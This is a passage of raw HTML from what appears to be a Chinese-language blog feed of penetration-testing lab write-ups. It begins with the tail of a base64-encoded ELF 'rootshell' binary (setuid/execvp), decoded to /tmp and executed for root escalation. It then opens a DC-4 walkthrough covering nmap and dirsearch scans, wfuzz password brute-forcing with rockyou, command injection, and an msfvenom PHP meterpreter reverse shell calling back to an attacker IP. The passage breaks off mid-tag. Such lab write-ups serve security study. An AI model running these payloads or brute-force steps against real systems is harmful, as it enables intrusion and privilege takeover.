class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAIAL2Jpbi9zaAABGwM7</span><br><span class="line">OAAAAAYAAAAU8P&#x2F;&#x2F;hAAAAHTw&#x2F;&#x2F;+sAAAAhPD&#x2F;&#x2F;1QAAABp8f&#x2F;&#x2F;xAAAANTx&#x2F;&#x2F;&#x2F;kAAAANPL&#x2F;&#x2F;ywBAAAU</span><br><span class="line">AAAAAAAAAAF6UgABeBABGwwHCJABBxAUAAAAHAAAACjw&#x2F;&#x2F;8rAAAAAAAAAAAAAAAUAAAAAAAAAAF6</span><br><span class="line">UgABeBABGwwHCJABAAAkAAAAHAAAAIjv&#x2F;&#x2F;9gAAAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAFAAA</span><br><span class="line">AEQAAADA7&#x2F;&#x2F;&#x2F;CAAAAAAAAAAAAAAAHAAAAFwAAACd8P&#x2F;&#x2F;XQAAAABBDhCGAkMNBgJYDAcIAABEAAAA</span><br><span class="line">fAAAAOjw&#x2F;&#x2F;9dAAAAAEIOEI8CSQ4YjgNFDiCNBEUOKIwFRA4whgZIDjiDB0cOQGoOOEEOMEEOKEIO</span><br><span class="line">IEIOGEIOEEIOCAAQAAAAxAAAAADx&#x2F;&#x2F;8BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAHARAAAAAAAAMBEAAAAAAAABAAAAAAAAAEcAAAAAAAAADAAAAAAAAAAAEAAAAAAA</span><br><span class="line">AA0AAAAAAAAARBIAAAAAAAAZAAAAAAAAAOg9AAAAAAAAGwAAAAAAAAAIAAAAAAAAABoAAAAAAAAA</span><br><span class="line">8D0AAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7&#x2F;bwAAAAAIAwAAAAAAAAUAAAAAAAAAOAQAAAAAAAAG</span><br><span class="line">AAAAAAAAADADAAAAAAAACgAAAAAAAACiAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAAVAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAwAAAAAAAAAAQAAAAAAAAAIAAAAAAAAAeAAAAAAAAAAUAAAAAAAAAAcAAAAAAAAAFwAA</span><br><span class="line">AAAAAADQBQAAAAAAAAcAAAAAAAAAEAUAAAAAAAAIAAAAAAAAAMAAAAAAAAAACQAAAAAAAAAYAAAA</span><br><span class="line">AAAAAPv&#x2F;&#x2F;28AAAAAAAAACAAAAAD+&#x2F;&#x2F;9vAAAAAPAEAAAAAAAA&#x2F;&#x2F;&#x2F;&#x2F;bwAAAAABAAAAAAAAAPD&#x2F;&#x2F;28A</span><br><span class="line">AAAA2gQAAAAAAAD5&#x2F;&#x2F;9vAAAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+D0AAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">NhAAAAAAAABGEAAAAAAAAFYQAAAAAAAAZhAAAAAAAAB2EAAAAAAAAAAAAAAAAAAASEAAAAAAAABH</span><br><span class="line">Q0M6IChEZWJpYW4gMTAuMi4wLTE5KSAxMC4yLjAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAADAAEAqAIAAAAAAAAAAAAAAAAAAAAAAAADAAIAxAIAAAAAAAAAAAAAAAAAAAAAAAADAAMA6AIA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAADAAQACAMAAAAAAAAAAAAAAAAAAAAAAAADAAUAMAMAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAADAAYAOAQAAAAAAAAAAAAAAAAAAAAAAAADAAcA2gQAAAAAAAAAAAAAAAAAAAAAAAAD</span><br><span class="line">AAgA8AQAAAAAAAAAAAAAAAAAAAAAAAADAAkAEAUAAAAAAAAAAAAAAAAAAAAAAAADAAoA0AUAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAADAAsAABAAAAAAAAAAAAAAAAAAAAAAAAADAAwAIBAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAADAA0AgBAAAAAAAAAAAAAAAAAAAAAAAAADAA4AkBAAAAAAAAAAAAAAAAAAAAAAAAADAA8A</span><br><span class="line">RBIAAAAAAAAAAAAAAAAAAAAAAAADABAAACAAAAAAAAAAAAAAAAAAAAAAAAADABEADCAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAADABIASCAAAAAAAAAAAAAAAAAAAAAAAAADABMA6D0AAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAADABQA8D0AAAAAAAAAAAAAAAAAAAAAAAADABUA+D0AAAAAAAAAAAAAAAAAAAAAAAADABYA2D8A</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAADABcAAEAAAAAAAAAAAAAAAAAAAAAAAAADABgAQEAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAADABkAUEAAAAAAAAAAAAAAAAAAAAAAAAADABoAAAAAAAAAAAAAAAAAAAAAAAEAAAAE</span><br><span class="line">APH&#x2F;AAAAAAAAAAAAAAAAAAAAAAwAAAACAA4AwBAAAAAAAAAAAAAAAAAAAA4AAAACAA4A8BAAAAAA</span><br><span class="line">AAAAAAAAAAAAACEAAAACAA4AMBEAAAAAAAAAAAAAAAAAADcAAAABABkAUEAAAAAAAAABAAAAAAAA</span><br><span class="line">AEMAAAABABQA8D0AAAAAAAAAAAAAAAAAAGoAAAACAA4AcBEAAAAAAAAAAAAAAAAAAHYAAAABABMA</span><br><span class="line">6D0AAAAAAAAAAAAAAAAAAJUAAAAEAPH&#x2F;AAAAAAAAAAAAAAAAAAAAAAEAAAAEAPH&#x2F;AAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAKEAAAABABIATCEAAAAAAAAAAAAAAAAAAAAAAAAEAPH&#x2F;AAAAAAAAAAAAAAAAAAAAAK8A</span><br><span class="line">AAAAABMA8D0AAAAAAAAAAAAAAAAAAMAAAAABABUA+D0AAAAAAAAAAAAAAAAAAMkAAAAAABMA6D0A</span><br><span class="line">AAAAAAAAAAAAAAAAANwAAAAAABEADCAAAAAAAAAAAAAAAAAAAO8AAAABABcAAEAAAAAAAAAAAAAA</span><br><span class="line">AAAAAJkBAAACAAsAABAAAAAAAAAAAAAAAAAAAAUBAAASAA4AQBIAAAAAAAABAAAAAAAAABUBAAAg</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAFkBAAAgABgAQEAAAAAAAAAAAAAAAAAAADEBAAAQABgAUEAAAAAA</span><br><span class="line">AAAAAAAAAAAAAA8BAAASAg8ARBIAAAAAAAAAAAAAAAAAADgBAAASAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AFcBAAAQABgAQEAAAAAAAAAAAAAAAAAAAGQBAAAgAAAAAAAAAAAAAAAAAAAAAAAAAHMBAAARAhgA</span><br><span class="line">SEAAAAAAAAAAAAAAAAAAAIABAAARABAAACAAAAAAAAAEAAAAAAAAAI8BAAASAA4A4BEAAAAAAABd</span><br><span class="line">AAAAAAAAALsAAAAQABkAWEAAAAAAAAAAAAAAAAAAAF0BAAASAA4AkBAAAAAAAAArAAAAAAAAAJ8B</span><br><span class="line">AAAQABkAUEAAAAAAAAAAAAAAAAAAAKsBAAASAA4AdREAAAAAAABdAAAAAAAAALABAAASAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAMQBAAASAAAAAAAAAAAAAAAAAAAAAAAAANgBAAARAhgAUEAAAAAAAAAAAAAA</span><br><span class="line">AAAAAOQBAAAgAAAAAAAAAAAAAAAAAAAAAAAAAP4BAAASAAAAAAAAAAAAAAAAAAAAAAAAABICAAAi</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAC4CAAASAAAAAAAAAAAAAAAAAAAAAAAAAEMCAAASAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAABjcnRzdHVmZi5jAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAF9fZG9fZ2xvYmFsX2R0</span><br><span class="line">b3JzX2F1eABjb21wbGV0ZWQuMABfX2RvX2dsb2JhbF9kdG9yc19hdXhfZmluaV9hcnJheV9lbnRy</span><br><span class="line">eQBmcmFtZV9kdW1teQBfX2ZyYW1lX2R1bW15X2luaXRfYXJyYXlfZW50cnkAcm9vdHNoZWxsLmMA</span><br><span class="line">X19GUkFNRV9FTkRfXwBfX2luaXRfYXJyYXlfZW5kAF9EWU5BTUlDAF9faW5pdF9hcnJheV9zdGFy</span><br><span class="line">dABfX0dOVV9FSF9GUkFNRV9IRFIAX0dMT0JBTF9PRkZTRVRfVEFCTEVfAF9fbGliY19jc3VfZmlu</span><br><span class="line">aQBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX2VkYXRhAF9fbGliY19zdGFydF9tYWluQEBH</span><br><span class="line">TElCQ18yLjIuNQBfX2RhdGFfc3RhcnQAX19nbW9uX3N0YXJ0X18AX19kc29faGFuZGxlAF9JT19z</span><br><span class="line">dGRpbl91c2VkAF9fbGliY19jc3VfaW5pdABfX2Jzc19zdGFydABtYWluAHNldGdpZEBAR0xJQkNf</span><br><span class="line">Mi4yLjUAZXhlY3ZwQEBHTElCQ18yLjIuNQBfX1RNQ19FTkRfXwBfSVRNX3JlZ2lzdGVyVE1DbG9u</span><br><span class="line">ZVRhYmxlAHNldHVpZEBAR0xJQkNfMi4yLjUAX19jeGFfZmluYWxpemVAQEdMSUJDXzIuMi41AHNl</span><br><span class="line">dGVnaWRAQEdMSUJDXzIuMi41AHNldGV1aWRAQEdMSUJDXzIuMi41AAAuc3ltdGFiAC5zdHJ0YWIA</span><br><span class="line">LnNoc3RydGFiAC5pbnRlcnAALm5vdGUuZ251LmJ1aWxkLWlkAC5ub3RlLkFCSS10YWcALmdudS5o</span><br><span class="line">YXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJlbGEuZHlu</span><br><span class="line">AC5yZWxhLnBsdAAuaW5pdAAucGx0LmdvdAAudGV4dAAuZmluaQAucm9kYXRhAC5laF9mcmFtZV9o</span><br><span class="line">ZHIALmVoX2ZyYW1lAC5pbml0X2FycmF5AC5maW5pX2FycmF5AC5keW5hbWljAC5nb3QucGx0AC5k</span><br><span class="line">YXRhAC5ic3MALmNvbW1lbnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbAAAAAQAAAAIAAAAAAAAAqAIAAAAAAACoAgAAAAAA</span><br><span class="line">ABwAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAIwAAAAcAAAACAAAAAAAAAMQCAAAAAAAA</span><br><span class="line">xAIAAAAAAAAkAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAADYAAAAHAAAAAgAAAAAAAADo</span><br><span class="line">AgAAAAAAAOgCAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAA9v&#x2F;&#x2F;bwIA</span><br><span class="line">AAAAAAAACAMAAAAAAAAIAwAAAAAAACQAAAAAAAAABQAAAAAAAAAIAAAAAAAAAAAAAAAAAAAATgAA</span><br><span class="line">AAsAAAACAAAAAAAAADADAAAAAAAAMAMAAAAAAAAIAQAAAAAAAAYAAAABAAAACAAAAAAAAAAYAAAA</span><br><span class="line">AAAAAFYAAAADAAAAAgAAAAAAAAA4BAAAAAAAADgEAAAAAAAAogAAAAAAAAAAAAAAAAAAAAEAAAAA</span><br><span class="line">AAAAAAAAAAAAAABeAAAA&#x2F;&#x2F;&#x2F;&#x2F;bwIAAAAAAAAA2gQAAAAAAADaBAAAAAAAABYAAAAAAAAABQAAAAAA</span><br><span class="line">AAACAAAAAAAAAAIAAAAAAAAAawAAAP7&#x2F;&#x2F;28CAAAAAAAAAPAEAAAAAAAA8AQAAAAAAAAgAAAAAAAA</span><br><span class="line">AAYAAAABAAAACAAAAAAAAAAAAAAAAAAAAHoAAAAEAAAAAgAAAAAAAAAQBQAAAAAAABAFAAAAAAAA</span><br><span class="line">wAAAAAAAAAAFAAAAAAAAAAgAAAAAAAAAGAAAAAAAAACEAAAABAAAAEIAAAAAAAAA0AUAAAAAAADQ</span><br><span class="line">BQAAAAAAAHgAAAAAAAAABQAAABcAAAAIAAAAAAAAABgAAAAAAAAAjgAAAAEAAAAGAAAAAAAAAAAQ</span><br><span class="line">AAAAAAAAABAAAAAAAAAXAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAIkAAAABAAAABgAA</span><br><span class="line">AAAAAAAgEAAAAAAAACAQAAAAAAAAYAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAACUAAAA</span><br><span class="line">AQAAAAYAAAAAAAAAgBAAAAAAAACAEAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAA</span><br><span class="line">AAAAnQAAAAEAAAAGAAAAAAAAAJAQAAAAAAAAkBAAAAAAAACxAQAAAAAAAAAAAAAAAAAAEAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAKMAAAABAAAABgAAAAAAAABEEgAAAAAAAEQSAAAAAAAACQAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAQAAAAAAAAAAAAAAAAAAACpAAAAAQAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAwAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAsQAAAAEAAAACAAAAAAAAAAwgAAAAAAAADCAAAAAAAAA8</span><br><span class="line">AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAL8AAAABAAAAAgAAAAAAAABIIAAAAAAAAEgg</span><br><span class="line">AAAAAAAACAEAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADJAAAADgAAAAMAAAAAAAAA6D0A</span><br><span class="line">AAAAAADoLQAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA1QAAAA8AAAADAAAA</span><br><span class="line">AAAAAPA9AAAAAAAA8C0AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAOEAAAAG</span><br><span class="line">AAAAAwAAAAAAAAD4PQAAAAAAAPgtAAAAAAAA4AEAAAAAAAAGAAAAAAAAAAgAAAAAAAAAEAAAAAAA</span><br><span class="line">AACYAAAAAQAAAAMAAAAAAAAA2D8AAAAAAADYLwAAAAAAACgAAAAAAAAAAAAAAAAAAAAIAAAAAAAA</span><br><span class="line">AAgAAAAAAAAA6gAAAAEAAAADAAAAAAAAAABAAAAAAAAAADAAAAAAAABAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">CAAAAAAAAAAIAAAAAAAAAPMAAAABAAAAAwAAAAAAAABAQAAAAAAAAEAwAAAAAAAAEAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAgAAAAAAAAAAAAAAAAAAAD5AAAACAAAAAMAAAAAAAAAUEAAAAAAAABQMAAAAAAAAAgA</span><br><span class="line">AAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA&#x2F;gAAAAEAAAAwAAAAAAAAAAAAAAAAAAAAUDAA</span><br><span class="line">AAAAAAAfAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAEAAAACAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAHAwAAAAAAAAYAYAAAAAAAAcAAAALQAAAAgAAAAAAAAAGAAAAAAAAAAJAAAAAwAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAADQNgAAAAAAAFgCAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAEQAAAAMA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAKDkAAAAAAAAHAQAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAA</span><br><span class="line">AA&#x3D;&#x3D;&quot; | base64 -d &gt; &#x2F;tmp&#x2F;rootshell</span><br><span class="line">chmod +x &#x2F;tmp&#x2F;rootshell</span><br><span class="line">&#x2F;tmp&#x2F;rootshell</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DC-4</title>
      <link href="2021/01/03/DC-4/"/>
      <url>2021/01/03/DC-4/</url>
      
        <content type="html"><![CDATA[<h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.56.105</p><p>靶机IP：192.168.56.130</p><p>修改一下hosts如下：</p><p><img src="https://img.rruu.net/image/6038156eafb75" alt="image-20201229123230114"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -n -sV -p- -oA DC-4 192.168.56.130</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/60381573d2854" alt="image-20201229123346821"></p><p>开放：22 80</p><p>22 ssh</p><p>80 http</p><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http:&#x2F;&#x2F;192.168.56.130&#x2F; -e php --full-url</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/6038157947890" alt="image-20201229123640964"></p><p>没有发现有价值的东西，我们使用firefox打开web看看，发现一个登陆系统，我们直接使用wfuzz暴力破解。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox http:&#x2F;&#x2F;192.168.56.130</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/6038157ee561c" alt="image-20201229132819712"></p><h3 id="使用Wfuzz暴力破解"><a href="#使用Wfuzz暴力破解" class="headerlink" title="使用Wfuzz暴力破解"></a>使用Wfuzz暴力破解</h3><p>检测密码为happy，我们使用happy登录系统。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt  --hh 206 -d &quot;username&#x3D;admin&amp;password&#x3D;FUZZ&quot; http:&#x2F;&#x2F;192.168.56.130&#x2F;login.php</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/60381583f0c0f" alt="image-20201229132931955"></p><p>登录成功</p><p><img src="https://img.rruu.net/image/603815891f364" alt="image-20201229133304239"></p><h3 id="挖掘命令执行"><a href="#挖掘命令执行" class="headerlink" title="挖掘命令执行"></a>挖掘命令执行</h3><p>进入command，点击run。</p><p><img src="https://img.rruu.net/image/6038158e483e5" alt="image-20201229133713664"></p><p>使用burpsuite抓包查看</p><p><img src="https://img.rruu.net/image/60381594e9b30" alt="image-20201229133648803"></p><p>输入id尝试一下</p><p><img src="https://img.rruu.net/image/6038159b1826b" alt="image-20201229133810805"></p><h4 id="msf反弹shell"><a href="#msf反弹shell" class="headerlink" title="msf反弹shell"></a>msf反弹shell</h4><p>msf生成phpshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.56.105 LPORT&#x3D;9000 -f raw &gt; shell.php</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815a0c1892" alt="image-20201229133925138"></p><p>burpsuite写入shell</p><p><img src="https://img.rruu.net/image/603815a682c25" alt="image-20201229134446931"></p><p>查看tmp目录的shell是否写入</p><p><img 